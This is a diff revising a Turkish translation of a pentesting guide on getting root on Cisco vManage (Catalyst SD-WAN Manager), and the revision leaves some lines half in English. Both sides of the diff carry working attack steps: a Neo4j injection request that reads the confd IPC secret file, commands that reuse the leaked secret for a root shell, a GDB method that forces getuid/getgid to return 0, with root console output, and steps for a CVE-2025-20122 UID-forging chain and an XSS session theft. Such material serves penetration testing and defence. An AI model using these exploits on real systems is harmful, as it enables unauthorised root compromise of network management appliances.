@@ -6,13 +6,13 @@
 
 (Örnek: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Biraz `confd` ve farklı ikili dosyalarla ilgili bazı [dokümantasyonları](http://66.218.245.39/doc/html/rn03re18.html) (Cisco web sitesinde bir hesapla erişilebilir) inceledikten sonra, IPC soketini doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bir gizli anahtar kullandığını bulduk:
+Biraz `confd` ve farklı ikili dosyalarla ilgili bazı [documentation] belgelerini inceledikten sonra (Cisco web sitesinde bir hesapla erişilebilir), IPC soketini doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bulunan bir secret kullandığını bulduk:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Neo4j instance'ımızı hatırlıyor musunuz? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da önceki vulnerability'yi kullanarak dosyayı almamıza olanak sağlıyor:
+Neo4j örneğimizi hatırlıyor musunuz? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da önceki güvenlik açığını kullanarak dosyayı almamıza olanak tanıyor:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` programı komut satırı argümanlarını desteklemiyor fakat argümanlarla `/usr/bin/confd_cli_user`'ı çağırıyor. Bu yüzden kendi argümanlarımızla doğrudan `/usr/bin/confd_cli_user`'ı çağırabiliriz. Ancak şu anki ayrıcalıklarımızla okunamıyor; bu yüzden onu rootfs'ten alıp scp ile kopyalamalı, help'ini okumalı ve shell elde etmek için kullanmalıyız:
+The `confd_cli` programı komut satırı argümanlarını desteklemiyor ancak argümanlarla `/usr/bin/confd_cli_user`'ı çağırıyor. Bu yüzden `/usr/bin/confd_cli_user`'ı kendi argümanlarımızla doğrudan çağırabiliriz. Ancak şu anki ayrıcalıklarımızla okunamıyor, bu yüzden onu rootfs'ten alıp scp ile kopyalamalı, yardımını okumalı ve shell elde etmek için kullanmalıyız:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -46,9 +46,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 (Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-synacktiv ekibinin blog¹'ü root shell elde etmek için zarif bir yol anlatıyordu, fakat sıkıntı şu ki bu, sadece root tarafından okunabilen `/usr/bin/confd_cli_user` dosyasının bir kopyasını almayı gerektiriyor. Ben böyle zahmete girmeden root'a yükselmenin başka bir yolunu buldum.
+synacktiv ekibi tarafından yazılan blog¹, root shell almak için zarif bir yol tarif ediyordu, ancak sakıncası `/usr/bin/confd_cli_user` kopyasını elde etmeyi gerektirmesidir; bu dosya yalnızca root tarafından okunabiliyor. Ben böyle zahmete girmeden root'a yükselmenin başka bir yolunu buldum.
 
-`/usr/bin/confd_cli` ikili dosyasını ayırıp incelediğimde aşağıdakileri gözlemledim:
+`/usr/bin/confd_cli` ikili dosyası üzerinde tersine mühendislik yaptığımda, aşağıdakileri gözlemledim:
 
 <details>
 <summary>Objdump showing UID/GID collection</summary>
@@ -82,20 +82,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-“ps aux” komutunu çalıştırdığımda, aşağıdakileri gözlemledim (_note -g 100 -u 107_)
+“ps aux” çalıştırdığımda, aşağıdakileri gözlemledim (_not -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Varsaydım ki “confd_cli” programı, oturum açmış kullanıcıdan topladığı kullanıcı kimliği (UID) ve grup kimliğini (GID) “cmdptywrapper” uygulamasına geçiriyor.
+“confd_cli” programının oturum açmış kullanıcıdan topladığı user ID ve group ID’yi “cmdptywrapper” uygulamasına ilettiğini varsaydım.
 
-İlk denememde “cmdptywrapper”'ı doğrudan çalıştırıp `-g 0 -u 0` ile beslemeyi denedim, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.
+İlk denemem “cmdptywrapper”’ı doğrudan çalıştırıp ona `-g 0 -u 0` vermekti, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcı (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.
 
-synacktiv’s blog(last example)'de bahsedildiği gibi, `confd_cli` programı komut satırı argümanlarını desteklemiyor, ancak bir debugger ile onu etkileyebiliyorum ve neyse ki sistemde GDB yüklü.
+synacktiv’in blogunda bahsedildiği gibi(son örnek), `confd_cli` programı komut satırı argümanlarını desteklemiyor, fakat bir debugger ile etkileyebiliyorum ve neyse ki sistemde GDB mevcut.
 
-getuid ve getgid API'lerini 0 döndürecek şekilde zorladığım bir GDB scripti oluşturdum. Zaten deserialization RCE ile “vmanage” ayrıcalığına sahip olduğum için `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
+`getuid` ve `getgid` API'lerini 0 döndürecek şekilde zorladığım bir GDB scripti oluşturdum. Zaten deserialization RCE ile “vmanage” ayrıcalığına sahip olduğum için `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
 
 root.gdb:
 ```
@@ -118,7 +118,7 @@ run
 Konsol Çıktısı:
 
 <details>
-<summary>Konsol Çıktısı</summary>
+<summary>Konsol çıktısı</summary>
 ```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -156,17 +156,17 @@ bash-4.4#
 
 ## Path 3 (2025 CLI input validation bug)
 
-Cisco, vManage'i *Catalyst SD-WAN Manager* olarak yeniden adlandırdı, ancak alttaki CLI aynı kutuda çalışmaya devam ediyor. 2025 tarihli bir advisory (CVE-2025-20122), CLI'deki yetersiz input validation'ın **herhangi bir kimliği doğrulanmış yerel kullanıcıya** manager CLI servisine hazırlanmış bir istek göndererek root elde etme imkanı verdiğini açıklıyor. Herhangi bir düşük ayrıcalıklı foothold ile (ör. Path1'deki Neo4j deserialization veya bir cron/backup kullanıcı shell'i) bu hatayı birleştirerek `confd_cli_user`'ı kopyalamaya veya GDB bağlamaya gerek kalmadan root'a atlayabilirsiniz:
+Cisco renamed vManage to *Catalyst SD-WAN Manager*, ancak alttaki CLI aynı cihazda çalışmaya devam ediyor. 2025 tarihli bir advisory (CVE-2025-20122), CLI'de yetersiz input validation olduğunu ve manager CLI servisine hazırlanmış bir istek göndererek **herhangi bir authenticated local user**'ın root elde etmesine izin verdiğini açıklıyor. Herhangi bir düşük ayrıcalıklı foothold ile (ör. Path1'deki Neo4j deserialization veya bir cron/backup kullanıcı shell) bu hatayı birleştirerek `confd_cli_user`'ı kopyalamadan veya GDB eklemeden root'a atlayabilirsiniz:
 
-1. Düşük ayrıcalıklı shell'inizi kullanarak CLI IPC endpoint'ini bulun (genellikle Path2'de görülen ve port 4565'te dinleyen `cmdptywrapper` listener).
-2. UID/GID alanlarını 0 olarak sahteleştiren bir CLI isteği oluşturun. Validation bug, orijinal çağıranın UID'sini zorunlu kılmıyor, bu yüzden wrapper root yetkili bir PTY başlatıyor.
-3. Root shell elde etmek için herhangi bir komut dizisini (`vshell; id`) sahtelenmiş istek üzerinden pipe edin.
+1. Düşük ayrıcalıklı shell'inizi kullanarak CLI IPC endpoint'ini bulun (genelde Path2'de port 4565 üzerinde görülen `cmdptywrapper` listener'ı).
+2. UID/GID alanlarını 0 olarak forgeleyecek bir CLI isteği oluşturun. Doğrulama hatası orijinal çağırıcının UID'sini zorlamıyor, bu yüzden wrapper root-backed bir PTY başlatıyor.
+3. Herhangi bir komut dizisini (`vshell; id`) forged istek üzerinden pipe'layarak root shell elde edin.
 
-> Exploit yüzeyi sadece local; initial shell'i elde etmek için hâlâ remote code execution gerekiyor, ancak kutunun içine girdikten sonra exploitation, debugger-based UID patch yerine tek bir IPC mesajıyla gerçekleşiyor.
+> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
 
-## Diğer yakın tarihli vManage/Catalyst SD-WAN Manager zincirlenebilecek zafiyetler
+## Zincir için diğer yakın tarihli vManage/Catalyst SD-WAN Manager zafiyetleri
 
-* **Authenticated UI XSS (CVE-2024-20475)** – Belirli arayüz alanlarına JavaScript enjekte edin; bir admin oturumunu çalmak, size tarayıcı kaynaklı bir yol sağlar: `vshell` → yerel shell → Path3 ile root.
+* **Authenticated UI XSS (CVE-2024-20475)** – Belirli arayüz alanlarına JavaScript enjekte edin; bir admin oturumunu çalmak size tarayıcı kaynaklı bir yol sağlar: `vshell` → yerel shell → Path3 ile root.
 
 ## References
 
